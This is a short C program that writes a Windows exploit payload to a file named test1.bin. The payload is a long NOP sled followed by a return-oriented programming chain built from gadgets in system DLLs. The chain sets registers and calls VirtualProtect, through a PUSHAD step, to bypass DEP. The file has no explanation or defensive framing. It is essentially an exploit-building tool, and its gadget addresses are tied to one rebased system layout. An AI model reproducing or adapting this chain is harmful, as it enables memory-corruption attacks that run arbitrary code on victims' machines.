#include <stdio.h>
#include <string.h>
unsigned int shellcode[]=
{
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,0x90909090,0x90909090,
     0x90909090,0x90909090,
     
    
     0x76e37383,  
     
    // POP EAX // RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x765513dc,  // ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x68f953a1,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [gdiplus.dll] ** REBASED ** ASLR 
      0x75833e52,  // XCHG EAX,ESI // RETN [COMDLG32.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x71d88ada,  // POP EBP // RETN [WINMM.dll] ** REBASED ** ASLR 
      0x758c4974,  // & call esp [msvcp_win.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x772d9bb2,  // POP EAX // RETN [SHELL32.dll] ** REBASED ** ASLR 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x76a6c6f9,  // NEG EAX // RETN [combase.dll] ** REBASED ** ASLR 
      0x68f15d28,  // XCHG EAX,EBX // RETN [gdiplus.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x76475dc2,  // POP EAX // RETN [sechost.dll] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x7613a12c,  // NEG EAX // RETN [gdi32full.dll] ** REBASED ** ASLR 
      0x76ec2e2d,  // XCHG EAX,EDX // RETN [SHELL32.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x769b323a,  // POP ECX // RETN [combase.dll] ** REBASED ** ASLR 
      0x71da46ad,  // &Writable location [WINMM.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_edi:---]
      0x76104493,  // POP EDI // RETN [gdi32full.dll] ** REBASED ** ASLR 
      0x7651be04,  // RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x76c39a32,  // POP EAX // RETN [USER32.dll] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x76974bd9,  // PUSHAD // RETN [combase.dll] ** REBASED ** ASLR 
      
};


int main()
{
   
    FILE *fw = fopen("test1.bin", "wb");
    
    fwrite(shellcode, sizeof(unsigned int), 73, fw);
  
    fclose(fw);
    return 0;
}